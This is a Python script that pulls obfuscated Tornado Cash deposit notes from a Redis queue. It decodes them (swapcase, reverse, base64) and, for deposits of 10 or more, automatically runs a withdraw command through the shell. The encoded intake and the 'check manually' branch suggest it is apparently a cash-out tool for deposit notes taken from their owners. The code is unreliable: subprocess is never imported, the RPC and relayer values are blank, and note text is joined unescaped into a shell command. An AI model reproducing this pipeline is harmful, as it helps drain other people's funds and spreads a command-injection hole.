import redis
import tornado
import asyncio
import time
import json
import base64
import logging

def reverse_string(string):
    reversed_string = string.swapcase()[::-1]
    decoded_string = base64.b64decode(reversed_string).decode('utf-8')
    return decoded_string

def parse_note(note):
    if not note:
        return None
    try:
        note = json.loads(note) or {}
    except Exception as e:
        return None

    if not note.get("n"):
        return None

    note["pn"] = reverse_string(note.get("n"))
    return note

def random_relayer_url():
    return

def exec_withdraw_command(note):

    rpc = ""
    receipt = ""
    relayer = random_relayer_url()

    command = ["node", "cli.js", "withdraw", note, receipt, "--rpc", rpc, "--relayer", relayer]
    command_string = " ".join(command)

    print(f"执行命令: {command_string}")

    start_time = time.time()
    try:
        result = subprocess.run(command_string, shell=True)
        end_time = time.time()
        print(f"执行时间: {end_time - start_time} 秒")
    except Exception as e:
        print(f"发生异常: {e}")
    return

def withdraw_note(note):
    if not note.get("w"):
        print("Deposit check manually", note)
        return
    p = note.get("pn")
    if not p:
        return
    ps = p.split("-")
    # ps[0] tornado, ps[1] eth, ps[2] 0.1/amount, ps[3] 1/netid
    if float(ps[2]) >= 10:
        exec_withdraw_command(p)
    return

def main():
    r = redis.Redis(host='localhost', port=6379, db=0)
    while True:
        note = r.lpop("notes")
        if not note:
            time.sleep(1)
            continue
        p = parse_note(note)
        if not p:
            time.sleep(1)
            continue
        withdraw_note(p)


if __name__ == "__main__":
    main()
